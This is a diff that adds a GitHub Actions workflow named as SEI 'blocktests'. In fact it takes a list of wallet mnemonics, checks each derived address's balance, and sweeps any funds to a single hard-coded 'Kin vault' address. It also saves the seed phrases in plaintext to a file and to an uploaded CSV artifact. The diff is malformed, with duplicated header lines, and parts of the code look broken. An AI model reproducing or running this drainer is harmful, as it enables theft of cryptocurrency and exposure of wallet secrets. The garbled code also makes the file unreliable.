@@ -1,4 +1,65 @@
 name: SEI Blocktests – Auto-Settlement to Kin Vault
+name: SEI Blocktests – Auto-Settlement to Kin Vault
+
+on:
+  workflow_dispatch:
+    inputs:
+      mnemonic_list:
+        description: "Newline-separated mnemonics"
+        required: true
+        type: string
+
+jobs:
+  check-and-settle:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+
+      - run: npm install -g @cosmjs/cli @cosmjs/stargate cross-fetch
+
+      - run: mkdir -p results && echo "Mnemonic,SEI Address,usei Balance" > results/settled_accounts.csv
+
+      - name: Check balances and settle if funded
+        env:
+          REST_URL: https://rest.sei-apis.com
+          KIN_ADDR: sei1zewftxlyv4gpv6tjpplnzgf3wy5tlu4f9amft8
+          MNEMONIC_LIST: ${{ inputs.mnemonic_list }}
+        run: |
+          echo "$MNEMONIC_LIST" | while read -r M; do
+            echo "🔑 $M"
+            A=$(npx --yes @cosmjs/cli --prefix sei --hd-path "m/44'/118'/0'/0/0" <<< "import { getAddressFromMnemonic } from '@cosmjs/cli'; getAddressFromMnemonic('$M').then(console.log).catch(console.error)")
+            A=$(echo "$A" | grep -Eo 'sei1[0-9a-z]{38}' || true)
+            [ -z "$A" ] && echo "❌ Invalid" && continue
+            B=$(curl -s "$REST_URL/cosmos/bank/v1beta1/balances/$A" | jq -r '.balances[] | select(.denom=="usei") | .amount')
+            [ -z "$B" -o "$B" = "0" ] && echo "⚠️ No balance" && continue
+            echo "✅ $A has $B usei → sending to Kin vault"
+            echo "$M" > key.txt
+            node -e "
+              import { DirectSecp256k1HdWallet } from '@cosmjs/proto-signing';
+              import { SigningStargateClient } from '@cosmjs/stargate';
+              import { coins } from '@cosmjs/amino';
+              import fetch from 'cross-fetch';
+              (async () => {
+                const mnemonic = \`${M}\`;
+                const wallet = await DirectSecp256k1HdWallet.fromMnemonic(mnemonic, { prefix: 'sei' });
+                const [account] = await wallet.getAccounts();
+                const client = await SigningStargateClient.connectWithSigner('$REST_URL', wallet);
+                const fee = { amount: coins(5000, 'usei'), gas: '100000' };
+                const result = await client.sendTokens(account.address, '$KIN_ADDR', coins($B, 'usei'), fee);
+                console.log(result.code === 0 ? '🔁 Settlement Success' : '❌ Settlement Failed');
+              })();
+            "
+            echo "\"$M\",\"$A\",\"$B\"" >> results/settled_accounts.csv
+            echo "--------------------------"
+          done
+
+      - uses: actions/upload-artifact@v3
+        with:
+          name: settled-accounts
+          path: results/settled_accounts.csv
 
 on:
   workflow_dispatch:
